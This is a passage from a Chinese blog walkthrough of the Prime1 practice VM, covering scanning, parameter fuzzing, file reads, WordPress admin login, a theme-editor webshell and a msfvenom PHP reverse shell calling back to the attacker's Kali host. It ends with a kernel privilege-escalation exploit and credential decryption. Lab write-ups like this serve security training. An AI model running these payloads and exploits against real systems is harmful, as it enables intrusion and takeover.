alt="image-20221103145005398"></p><p>那就只有<strong>目录扫描</strong>了</p><p>问题是怎么扫呢？用啥工具呢？</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>工具</p><ul><li>dirb</li><li>御剑</li><li>webscan</li><li>gobuster</li><li>dirsearch</li><li>BurpSuite</li><li>………（工具很多）</li></ul><p>我打开dirb就是一顿扫（kali自带dirb）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145</span><br></pre></td></tr></table></figure><p>啊嘞？还有工具连-u都不要加的？不管，看结果</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103160653117.png" alt="image-20221103160653117"></p><p>扫出了一个WordPress，一看就知道，这是个个人博客。</p><p>打开看看，果然！有没有发现这个victor有点似曾相识？？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103160539432.png" alt="image-20221103160539432"></p><p>嘚，白高兴一场，啥也没有发现。</p><p>接下来又看了看扫出来的其他目录，全是WordPress的大概看了下，这条路肝不下去了。</p><p>只能想想有没有其他办法。密码有没有可能存在一个文件里？首先想到的就是txt，接着我又用dirb对txt后缀的来了一顿扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .txt</span><br></pre></td></tr></table></figure><p>欸？？？这是啥？<code>secret.txt</code>？？？赶紧打开看看</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103161740535.png" alt="image-20221103161740535"></p><p>果然有东西啊！！（Prime1：看你太菜了给你点提示吧）</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103161920266.png" alt="image-20221103161920266"></p><p>整段翻译如下</p><blockquote><p>小伙子有点东西啊！</p><p>但还是菜了点哟！给你点提示：</p><p><strong>对你发现的每一页php做一些Fuzz，如果Fuzz到了正确的参数，然后照着下面的步骤做</strong></p><p><strong>查看<code>location.txt</code>，你就知道下一步该怎么走了。</strong></p><p>如果你还是菜的不行，来<a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">我们网站</a>学习一下基本工具的使用</p></blockquote><p>我不管，我才不要等下再用这个提示，我就是要现在就访问<code>location.txt</code>，不然我不甘心</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103162840784.png" alt="image-20221103162840784"></p><p>甘心了，，，对不起打扰了！</p><h2 id="Fuzz参数"><a href="#Fuzz参数" class="headerlink" title="Fuzz参数"></a>Fuzz参数</h2><p>既然上面提到php，那就先扫一下有哪些php，再针对每个php做Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .php</span><br></pre></td></tr></table></figure><p>就扫出来这俩</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103163102067.png" alt="image-20221103163102067"></p><p><strong>激动人心的Fuzz</strong></p><p>问题来了，Fuzz是个啥？不懂的来看看<a href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962?fr=aladdin">度娘的解释</a></p><p>看懂了么？我唬你呢！看了比没看还模糊了是吧哈哈哈</p><p>我这里用我自己的浅显理解来解释一下Fuzz</p><blockquote><p>Fuzz即<strong>模糊测试</strong></p><p>就是瞎鸡儿乱猜的意思</p><p>用上面的例子来说，要你Fuzz参数，那参数是个啥样子？get请求下就是<a href="http://192.168.120.145/index.php?%E5%8F%82%E6%95%B0=xxx">http://192.168.120.145/index.php?参数=xxx</a></p><p>至于参数是啥，我不知道啊，那我就只能乱猜，万一瞎猫碰上死耗子，给我猜对了呢？</p><p>Fuzz就是这样，不看技术，全看运气，谁也不知道到底能不能猜对</p></blockquote><p>工具随便哈，很多工具都可以做Fuzz（BP就可以）</p><p>我这里选择直接用kali里面自带的工具<code>wfuzz</code>和自带的字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103170429320.png" alt="image-20221103170429320"></p><p>这里解释下这几列的含义</p><ul><li>ID：就id，没啥别的意思</li><li>Response：HTTP请求返回的状态码</li><li>Lines：返回包的行数</li><li>Word：单词个数</li><li>Chars：字符个数</li><li>Payload：Fuzz的参数</li></ul><p>上面字典返回了900多条数据，那怎么找那些可能是正确的参数呢？思路是与大部分不同的一般就有蹊跷，因为大部分参数是错的，那正确的势必返回的就不一样。</p><p>Burp爆破的话，直接点一下排序就看出来了，这个破工具还要用命令行重新执行命令来排序，我真的会谢！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看看参数，看有啥可以用的</span></span><br><span class="line">wfuzz -h</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用参数过滤</span></span><br><span class="line">--hc# 过滤掉某个响应状态</span><br><span class="line">--hl# 过滤掉响应为x行的</span><br><span class="line">--hw# 过滤掉响应为x个单词的</span><br><span class="line">--hh# 过滤掉响应为x个字符的</span><br></pre></td></tr></table></figure><p>我这里随便选个过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hl 7 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p>结果是：糟糕！裤衩子都过滤没了</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103172027133.png" alt="image-20221103172027133"></p><p>那就只能换个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hw 12 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><h2 id="得到index-php的参数"><a href="#得到index-php的参数" class="headerlink" title="得到index.php的参数"></a>得到index.php的参数</h2><p>有东西啊！</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103172145627.png" alt="image-20221103172145627"></p><p>还记得上面<code>secret.txt</code>里面的提示吗？记不记得有个<code>location.txt</code>？</p><p>还有扫出来的两个php文件：<code>image.php</code>和<code>index.php</code></p><p>现在用这个Fuzz出来的参数试试吧！</p><p><code>image.php</code>没变化</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103183545155.png" alt="image-20221103183545155"></p><p><code>index.php</code>出现了点不一样的东西，多了些文字</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103172359891.png" alt="image-20221103172359891"></p><p>翻译</p><blockquote><p>小伙子不错啊！</p><p>现在你知道正确的参数了</p><p><strong>用<code>secrettier360</code>参数去尝试其他的php页面吧！</strong></p></blockquote><h2 id="得到iamge-php的参数"><a href="#得到iamge-php的参数" class="headerlink" title="得到iamge.php的参数"></a>得到iamge.php的参数</h2><p>这时，把上面没变化的<code>image.php</code>按照提示的参数试一试</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103184200350.png" alt="image-20221103184200350"></p><p>好的，你得到了正确的参数</p><h2 id="password-txt"><a href="#password-txt" class="headerlink" title="password.txt"></a>password.txt</h2><p>然后呢，就一句话就没了？？？思路好像又断了，继续往下想想，既然给了file让我们来读取文件，那我们可不可以去读取一些敏感文件呢？说干就干！</p><p>然而，emmmmmm…….又断了，系统提示挖错文件了</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103184903209.png" alt="image-20221103184903209"></p><p>试试另外一个，居然成了，好吧我装的，因为我去看了视频。</p><p>我一直在试前面那个<code>index.php</code>的参数，反而忽视了靶场一步步把我们引到到<code>image.php</code>，还给了正确的参数。</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103185510097.png" alt="image-20221103185510097"></p><p>接下来就顺着给出的提示，我尝试直接读取password.txt，没有结果</p><p>看了一眼上面的提示，Find <strong>password.txt</strong> in <strong>my directory</strong></p><p>分析主要的突破点是要知道提示所说的<strong>my directory</strong>是指的哪一个目录，想到Linux下，每一个用户都有一个home目录，用户名是victor，接下来我们就来验证这条猜想</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103190414091.png" alt="image-20221103190414091"></p><p>还是那句话，空空如也，我C他NN的！！！</p><p>这时候，我又去看了一眼上面的截图，就在我画框的后面，就有路径啊！！！我顺着那个路径找过去，出来了！还是我太菜了，Linux基础学的不好，才去分析上面那一堆有的没的。</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103190658299.png" alt="image-20221103190658299"></p><h2 id="登录WordPress"><a href="#登录WordPress" class="headerlink" title="登录WordPress"></a>登录WordPress</h2><p>当时看到这串字符的时候，我第一反应是有点懵，要我关注ippsec？？？这是啥意思，过了一会才反应过来，这有没有可能就是密码啊？而且这是password.txt欸？</p><p>拿着这串字符去试着登录了一下victor用户，喜提”密码错误“💔💔💔</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103190941126.png" alt="image-20221103190941126"></p><p>到这，我又不知道怎么办了。</p><p>去看了下视频的提示：<strong>这到底是什么的密码？</strong></p><p>于是我想起，之前端口扫描的时候，有个22端口，猜测有可能是<strong>SSH</strong>的密码，我马上打开我的XShell。</p><p>哈哈，没连上mad❗</p><p>然后我又想，还有啥密码？前面好像还有个WordPress博客，去试试看，也许就是这个呢？然后我往上翻了下之前目录扫描的截图，进到了<a href="http://192.168.120.145/wordpress/wp-admin%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%88%B0wordpress%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2">http://192.168.120.145/wordpress/wp-admin，然后跳转到wordpress的登陆界面</a></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103225332819.png" alt="image-20221103225332819"></p><p>用户名当然是猜的victor，因为之前看过这个博客首页，加上靶机上的登录用户名也是victor，密码输入follow_the_ippsec，点登录</p><blockquote><p>后面了解到，WordPress在搭建成功后会自动生成一篇博客，用户名就是管理员的用户名</p><p>还有Kali自带的工具<code>cmseek</code>和<code>wpscan</code>可以去扫描WordPress站点的用户名和漏洞，以及其他信息</p></blockquote><p>在几秒的转圈圈之后，进去了！！！</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103225535739.png" alt="image-20221103225535739"></p><p>找了一圈，没发现什么信息。唯一发现了一个邮箱，我还用这个邮箱去试了一下密码，不对，作罢！</p><p>又开始偷思路😂😂😂</p><h2 id="WordPress主题编辑"><a href="#WordPress主题编辑" class="headerlink" title="WordPress主题编辑"></a>WordPress主题编辑</h2><p>了解到【Appearance】的【Theme Editer】可以编辑主题，里面存在部分php可以被编辑，php哦！！！还是可以编辑的，那不直接一句话木马开搞？？？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103231333565.png" alt="image-20221103231333565"></p><p>接下来就是去找可以编辑的，连着点了好多个，都是这种不能修改的</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103231930552.png" alt="image-20221103231930552"></p><p>皇天不负有心人！终于找到一个能改的</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103232115455.png" alt="image-20221103232115455"></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>直接开整！！！等啥呀？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103232359755.png" alt="image-20221103232359755"></p><p>上传成功！nice！好了，就等着我拿下你吧小卡拉米！</p><p>高高兴兴掏出我的蚁剑</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104100447856.png" alt="image-20221104100447856"></p><p>好了，问题来了，我这个URL要怎么填？WordPress的后台编辑那里的url是<a href="http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen%EF%BC%8C%E8%BF%99%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%B8%8D%E8%A1%8C%E5%95%8A%EF%BC%8C%E6%88%91%E8%A6%81%E6%89%BE%E5%88%B0secret.php%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84%E6%89%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%AF%B9WordPress%E4%B8%8D%E7%86%9F%E6%82%89%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%8C%9C%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84%E3%80%82">http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen，这一看就不行啊，我要找到secret.php的真实路径才行，但是我对WordPress不熟悉，不知道怎么猜这个路径。</a></p><h2 id="确定路径"><a href="#确定路径" class="headerlink" title="确定路径"></a>确定路径</h2><p>我知道WordPress是开源的，于是我上<a href="https://core.trac.wordpress.org/browser/#branches/5.2/src/wp-admin/includes">WordPress官网</a>下了一份5.2版本的源码（<strong>Dashboard</strong>往下划，<strong>At a Glance</strong>板块可以看到WordPress的版本和使用的主题）</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104110916788.png" alt="image-20221104110916788"></p><p>然后就顺着这个线索，结合上面修改页面右侧的文件结构，在源码里找到了这个路径</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104111036384.png" alt="image-20221104111036384"></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104111310256.png" alt="image-20221104111310256"></p><p>接下来我就按照这个路径，用蚁剑去连了。</p><p>直接红一片我也是没想到</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104111549931.png" alt="image-20221104111549931"></p><p>然后我又去浏览器访问这个网址</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104111657882.png" alt="image-20221104111657882"></p><p>返回404，意思就是secret.php不在这个路径</p><p>到这里，思路又断了（真的太菜了）</p><p>继续偷思路（emm这叫借鉴！！）</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>了解到可以<strong>反弹shell</strong>，其实之前一直知道这个概念，但是没有实战过，所以也不知道什么时候该用，怎么用。这次真的是学到了！</p><p>继续用我浅显的理解来解释一下<strong>反弹shell</strong></p><blockquote><p>首先要明确：<strong>反弹shell</strong>和<strong>一句话木马</strong>的目的都是一样的，就是<strong>为了拿shell</strong></p><p>区别在于</p><ul><li>一句话木马：上传之后，你得主动用WebShell管理工具之类的东西去连他，连上了才可以</li><li>反弹shell：让<strong>它主动来连你</strong></li></ul><p>这有啥不一样呢？为啥一定要它来连你呢？你连他为啥又不行呢？</p><p>想象一下，你去别的学校找朋友玩泥巴，但是他们学校只允许本校师生进出，不允许外面的人进出。这时候，你们想见面一起玩泥巴，那就只能让他出来找你，因为门卫不让你进去找他啊！！（说翻墙钻狗洞进去的小伙子，你真是个大聪明🤡）</p><p>一样的意思，当一台机子处于<strong>内网、动态IP</strong>，或者<strong>配置了防火墙、杀毒软件</strong>，那很可能，你是没有办法去连接它的，只能让它出来连你，这就是<strong>反弹shell</strong></p></blockquote><h3 id="生成php反弹shell代码"><a href="#生成php反弹shell代码" class="headerlink" title="生成php反弹shell代码"></a>生成php反弹shell代码</h3><p>现在，用我们的<em><strong>美少妇（MSF）</strong></em>来生成php反弹shell的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.120.128 lport=6666 -o shell.php</span><br></pre></td></tr></table></figure><blockquote><p>这句话的意思是让msfvenom的php&#x2F;meterpreter&#x2F;reverse_tcp模块来生成反弹shell的脚本，设置让靶机来连Kali（IP:192.168.120.128）的6666端口，保存为<code>shell.php</code></p></blockquote><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104133526200.png" alt="image-20221104133526200"></p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>把生成的代码粘贴到<code>secret.php</code>里面（粘贴我上面黑色的那一坨，前面俩不要粘上去了），保存</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104134106090.png" alt="image-20221104134106090"></p><h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p>接下来，就是监听了</p><blockquote><p>为啥要监听？</p><p>接着上面的例子说哈，你朋友都出校门来找你玩泥巴来了，你不得蹲在门口等他吗？不然你怎么知道他出来了呢？只能蹲在门口守着呗。</p><p>这也是一样的，你让靶机来连你，你不监听那个端口，你咋知道它来连你那个端口了？</p></blockquote><p>那我们用啥来监听呢？<del>当然是亲自蹲在电脑显示器上呗</del>（bushi）</p><p>当然是用工具来监听啦~可用的工具有很多，这里推荐<code>nc</code>和<code>msfconsole</code></p><p>这里用msfconsole（因为它给我比心❤）</p><ol><li>命令行输入<code>msfconsole</code>，启动美少妇</li></ol><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104134918991.png" alt="image-20221104134918991"></p><ol start="2"><li>使用监听模块</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104135312786.png" alt="image-20221104135312786"></p><ol start="3"><li>告诉它，你在等待一个php的反弹来连你</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里的模块和上面使用msfvenom生成反弹shell的模块是一样的</span></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="4"><li>指定监听的IP和端口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.120.128</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><ol start="5"><li>启动监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任选一个执行，效果是一样的</span></span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>监听就准备好啦~接下来的问题是</p><p><strong>靶机什么时候来连我们呢？</strong></p><p>这就得你去提醒一下它，让他来连你，这时候我突然发现，我上面费大劲找的<code>secret.php</code>路径，这时候用得到了！！！</p><p>访问<a href="http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php</a></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104140546616.png" alt="image-20221104140546616"></p><p>页面虽然一直在加载，这时候打开我们的Kali看看，已经进入到meterpreter了！！！就是已经反弹连接上了，我们已经拿到靶机的shell了。</p><p>执行命令看看，没问题！</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104155213895.png" alt="image-20221104155213895"></p><blockquote><p>注意：</p><p>我们此时拿到的shell环境，并不是root用户，meterpreter并不能执行所有的命令</p></blockquote><h1 id="内核提权【适用于Ubuntu-4-10】"><a href="#内核提权【适用于Ubuntu-4-10】" class="headerlink" title="内核提权【适用于Ubuntu 4.10】"></a>内核提权【适用于Ubuntu 4.10】</h1><p>上面我们拿到了靶机的Linux版本，用msfconsole看看有没有能提权的模块</p><blockquote><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<em>不要在meterpreter下直接执行，新开一个Terminal，进入msfconsole里面执行</em></p><p>或者使用<code>background</code>回退到msf的界面，记住返回的<code>session</code>为1，到时候直接通过<code>sessions 1</code>回到meterpreter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 16.04 Ubuntu</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221104171340983.png" alt="image-20221104171340983"></p><p>使用其中符合条件的<em><strong>linux&#x2F;local&#x2F;45010.c</strong></em></p><blockquote><p>用来提权到root，用C语言编写其路径为&#x2F;usr&#x2F;share&#x2F;exploits&#x2F;local&#x2F;45010.c</p></blockquote><ol><li>将该文件拷贝到当前目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span><br></pre></td></tr></table></figure><ol start="2"><li>用<code>gcc</code>编译该文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>用meterpreter</strong>把上面生成的<code>45010</code>移动到靶机里面（<strong>此步骤在meterpreter里面执行！！！</strong>）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/slipper/45010 /tmp</span><br></pre></td></tr></table></figure><blockquote><p>本句的意思是：把本机<code>home/slipper/45010</code>上传到靶机的<code>/tmp</code>目录</p></blockquote><ol start="4"><li>进入shell，给<code>45010</code>添加可执行的权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3108 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经进入到靶机的shell环境</span></span><br><span class="line">pwd# 查看当前目录</span><br><span class="line">/tmp</span><br><span class="line">chmod +x 45010# 添加执行权限</span><br><span class="line">./45010# 执行该提权程序</span><br></pre></td></tr></table></figure><p>这时候已经提权成功了</p><h1 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h1><p>&#x3D;&#x3D;实际上，我的提权失败了&#x3D;&#x3D;</p><p>按理来说，是可以成功的，但是我当时没弄完就去做其他的事情，第二天再来弄的时候，我的靶机IP变了，从145变成147了。我当时觉得奇怪，因为我虚拟机Kali的IP一直就没变过，为什么这个突然变了。当时没有在意，直到我使用上述方法，屡次提权失败</p><p>于是，我几乎翻遍了网上关于Prime1这个靶机的记录，终于看到一句话：</p><p>&#x3D;&#x3D;有些情况我们下载的靶机的版本并不是Ubuntu4.10而是Ubuntu 4.15，就不能通过45010这个复现成功&#x3D;&#x3D;</p><p>但是我明明记得我是4.10。然后，我就又去看了一下我Ubuntu靶机的版本信息</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105150754154.png" alt="image-20221105150754154"></p><p>&#x3D;&#x3D;我的Ubuntu居然自动升级了！&#x3D;&#x3D;</p><p>可以往上看我当时的截图，当时的版本是4.10的，一觉起来，Ubuntu靶机给我自动升级成4.15了，估计也是这个原因，导致靶机的IP发生了变化。</p><p>而此时，4.15版本的已经不能使用上述方法提权了。我用msf搜索了升级之后的版本还有没有可以用的提权代码，已经🈚了，所以靠nday提权已经行不通了，靶机的设计者的目的并不是想让我们靠提权来拿到Flag，而是像上面一样，一层层的剥开，找到密码。</p><blockquote><p>这个问题真的折磨了我很久，第一次遇到这种骚操作</p></blockquote><h1 id="提权【适用于Ubuntu-4-15】"><a href="#提权【适用于Ubuntu-4-15】" class="headerlink" title="提权【适用于Ubuntu 4.15】"></a><strong>提权【适用于Ubuntu 4.15】</strong></h1><ol><li>进入shell环境</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">将shell升级到完全交互式的TTY</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看当前用户可以用 sudo 执行哪些命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105153916471.png" alt="image-20221105153916471"></p><p>这里的<code>/home/saket/enc</code>引起了注意，它是一个可执行文件，执行需要输入密码，使用<code>follow_the_ippsec</code>发现不对</p><h2 id="backup文件"><a href="#backup文件" class="headerlink" title="backup文件"></a>backup文件</h2><p>在<code>/opt</code>目录下发现<code>backup</code>文件夹，最终发现了<code>可执行文件enc</code>的密码为<code>backup_password</code></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105154613484.png" alt="image-20221105154613484"></p><ol start="4"><li>执行<code>enc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">./enc</span><br></pre></td></tr></table></figure><ol start="5"><li>此时发现<code>/home/saket</code>目录下多了两个文件：<code>enc.txt</code>和<code>key.txt</code></li></ol><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105155104206.png" alt="image-20221105155104206"></p><p>得到了一串字符和一条提示，看样子应该是base64编码的</p><ol start="6"><li>使用<a href="https://www.cmd5.com/">cmd5</a>加密<code>ippsec</code></li></ol><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105155927773.png" alt="image-20221105155927773"></p><p>得到</p><p>md5(ippsec,32) &#x3D; 366a74cb3c959de17d61db30591c39d1<br>md5(ippsec,16) &#x3D; 3c959de17d61db30</p><ol start="7"><li>使用<a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES Encryption and Decryption Online Tool</a>解密<code>enc.txt</code></li></ol><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105161448956.png" alt="image-20221105161448956"></p><p>解密结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=</span><br></pre></td></tr></table></figure><ol start="8"><li>对上面的字符串进行<a href="https://tool.chinaz.com/tools/base64.aspx">Base64解码</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,</span><br></pre></td></tr></table></figure><p>得到了密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tribute_to_ippsec</span><br></pre></td></tr></table></figure><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105162115763.png" alt="image-20221105162115763"></p><ul><li>查看saket用户可用sudo执行的命令</li></ul><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105165526516.png" alt="image-20221105165526516"></p><ul><li>跟进到&#x2F;home&#x2F;victor&#x2F;undefeated_victor</li></ul><p><img 